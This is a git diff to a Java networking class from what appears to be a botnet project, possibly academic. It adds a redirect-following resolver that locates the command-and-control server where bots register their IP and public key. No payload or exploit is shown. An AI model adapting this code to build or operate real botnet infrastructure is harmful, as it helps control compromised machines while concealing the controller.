@@ -3,9 +3,11 @@ package cs.sii.service.connection;
 import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
+import java.net.HttpURLConnection;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.SocketException;
+import java.net.URL;
 import java.net.UnknownHostException;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
@@ -272,8 +274,8 @@ public class NetworkService {
 	 * @return
 	 */
 	public boolean firstConnectToMockServerDns() {
+		String url = resolveDns(engineBot.getDnsurl());
 		if(engineBot.isCommandandconquerStatus()){
-			String url = engineBot.getDnsurl();
 			Boolean result = false;
 			result = cecReq.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
 			Pairs<IP, PublicKey> cec = new Pairs<>(getMyIp(),pki.getPubRSAKey());
@@ -281,7 +283,7 @@ public class NetworkService {
 			System.out.println("Ip tornato " + result);
 			return Boolean.TRUE;
 		}else{
-			String url = engineBot.getDnsurl() + engineBot.getUrirequest();
+			url = url + engineBot.getUrirequest();
 			Pairs<String, String> result = new Pairs<>();
 			Pairs<IP, PublicKey> cec = new Pairs<>();
 			try {
@@ -399,12 +401,37 @@ public class NetworkService {
 	 */
 	public Boolean updateDnsInformation(IP ip, String pk) {
 
-		String url = engineBot.getDnsurl();
+		String url = resolveDns(engineBot.getDnsurl());
 		Boolean result = false;
+		
 		result = cecReq.sendInfoToDnsServer(url,ip, pk);
 		System.out.println("Ip tornato " + result);
 		return result;
 	}
+	
+	
+	public String resolveDns(String dnsUrl) {
+		String url = "http://" + dnsUrl;
+		System.out.println("Risolvo dns: "+url);
+		String rediret = null;
+
+		HttpURLConnection connection = null;
+		try {
+			
+				URL uri;
+				uri = new URL(url);
+				connection = (HttpURLConnection) uri.openConnection();
+				connection.setInstanceFollowRedirects(false);
+				rediret = connection.getHeaderField("Location");
+				//System.out.println("risultato " + rediret);
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		return rediret;
+	}
+
+	
 	
 	public boolean updateBotNetwork() {
 		return true;
